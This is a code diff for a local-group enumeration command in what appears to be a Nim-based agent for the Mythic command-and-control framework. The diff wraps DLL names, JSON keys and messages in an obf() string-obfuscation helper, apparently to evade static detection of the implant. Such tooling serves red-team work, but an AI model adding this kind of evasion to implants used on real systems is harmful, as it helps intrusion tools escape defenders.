@@ -1,8 +1,7 @@
-## Net LocalGroup - Enumerate local groups
-
 import std/[json, strformat, os]
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
@@ -25,13 +24,13 @@ when defined(windows):
   proc NetLocalGroupEnum(servername: LPCWSTR, level: DWORD, bufptr: ptr pointer,
                          prefmaxlen: DWORD, entriesread: ptr DWORD,
                          totalentries: ptr DWORD, resumehandle: ptr DWORD): DWORD 
-    {.importc, dynlib: "netapi32.dll", stdcall.}
+    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
   
   proc NetApiBufferFree(Buffer: pointer): DWORD 
-    {.importc, dynlib: "netapi32.dll", stdcall.}
+    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
   
   proc ConvertSidToStringSidW(Sid: PSID, StringSid: ptr LPWSTR): WINBOOL 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc utf16PtrToString(p: LPWSTR): string =
     ## Convert UTF-16 pointer to Nim string
@@ -83,12 +82,12 @@ proc netLocalgroup*(taskId: string, params: JsonNode): JsonNode =
     try:
       # Parse parameters (computer is optional)
       var computerName = ""
-      if params.kind == JObject and params.hasKey("computer"):
-        computerName = params["computer"].getStr()
+      if params.kind == JObject and params.hasKey(obf("computer")):
+        computerName = params[obf("computer")].getStr()
       
       # Default to local computer if not specified
       if computerName == "":
-        computerName = getEnv("COMPUTERNAME", "Local")
+        computerName = getEnv(obf("COMPUTERNAME"), obf("Local"))
       
       debug &"[DEBUG] net_localgroup: computer={computerName}"
       
@@ -98,7 +97,7 @@ proc netLocalgroup*(taskId: string, params: JsonNode): JsonNode =
       var resumeHandle: DWORD = 0
       
       var computerNameW: LPCWSTR = nil
-      if computerName != "" and computerName != "Local":
+      if computerName != "" and computerName != obf("Local"):
         let tempW = newWideCString(computerName)
         computerNameW = cast[LPCWSTR](unsafeAddr tempW[0])
       
@@ -132,21 +131,21 @@ proc netLocalgroup*(taskId: string, params: JsonNode): JsonNode =
         # Free the buffer
         discard NetApiBufferFree(bufPtr)
       else:
-        return mythicError(taskId, &"Error enumerating local groups: {status}")
+        return mythicError(taskId, obf("Error enumerating local groups: ") & $status)
       
       # Convert to JSON
       var resultsJson = newJArray()
       for result in results:
         resultsJson.add(%*{
-          "computer_name": result.computer_name,
-          "group_name": result.group_name,
-          "comment": result.comment,
-          "sid": result.sid
+          obf("computer_name"): result.computer_name,
+          obf("group_name"): result.group_name,
+          obf("comment"): result.comment,
+          obf("sid"): result.sid
         })
       
       return mythicSuccess(taskId, $resultsJson)
       
     except Exception as e:
-      return mythicError(taskId, &"net_localgroup error: {e.msg}")
+      return mythicError(taskId, obf("net_localgroup error: ") & e.msg)
   else:
-    return mythicError(taskId, "net_localgroup command is only available on Windows")
+    return mythicError(taskId, obf("net_localgroup command is only available on Windows"))
